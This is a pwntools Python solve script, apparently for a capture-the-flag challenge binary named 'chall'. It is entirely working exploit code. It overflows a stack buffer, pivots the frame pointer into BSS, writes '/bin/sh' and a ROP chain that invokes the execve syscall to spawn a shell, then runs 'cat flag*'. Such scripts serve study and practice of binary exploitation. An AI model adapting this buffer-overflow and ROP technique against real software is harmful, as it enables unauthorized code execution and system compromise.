#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

p = process('./chall')

# Gadgets
pop_rdi = 0x402611
pop_rsi = 0x413e88
pop_rdi_pop_rbp_ret = 0x40a352
mov_edx_rsi_ret = 0x468f61
pop_rax = 0x42c417
syscall = 0x401453
ret = 0x401d4c

main_restart = 0x401a9d

# Safe address in BSS
safe_bss = 0x4ce000
target_rbp = safe_bss + 0x110

log.info(f"Target RBP: {hex(target_rbp)}")

# Step 1: Redirect rbp to BSS for the next run
payload1 = b'A' * 0x110
payload1 += p64(0) # saved rbp
payload1 += p64(ret) # alignment
payload1 += p64(pop_rdi_pop_rbp_ret)
payload1 += p64(0) # rdi
payload1 += p64(target_rbp)
payload1 += p64(main_restart)

p.sendlineafter(b'name: ', payload1)
p.sendlineafter(b'choice (1-4): ', b'4')

# Step 2: Write ROP chain to BSS and pivot RSP
bin_sh_addr = safe_bss
# Use an address far into BSS that should be 0 and untouched
zero_addr = safe_bss + 0x800 
junk_addr = safe_bss + 0x900

rop = [
    pop_rsi, zero_addr,
    pop_rdi, junk_addr,
    mov_edx_rsi_ret,
    pop_rdi, bin_sh_addr,
    pop_rsi, 0,
    pop_rax, 59,
    syscall
]

payload2 = b'/bin/sh\x00'.ljust(0x110, b'A')
payload2 += p64(target_rbp) # dummy rbp
payload2 += b''.join(p64(g) for g in rop)

log.info("Sending payload 2...")
p.sendlineafter(b'name: ', payload2)
p.sendlineafter(b'choice (1-4): ', b'4')

p.sendline(b'ls ; cat flag*')

p.interactive()
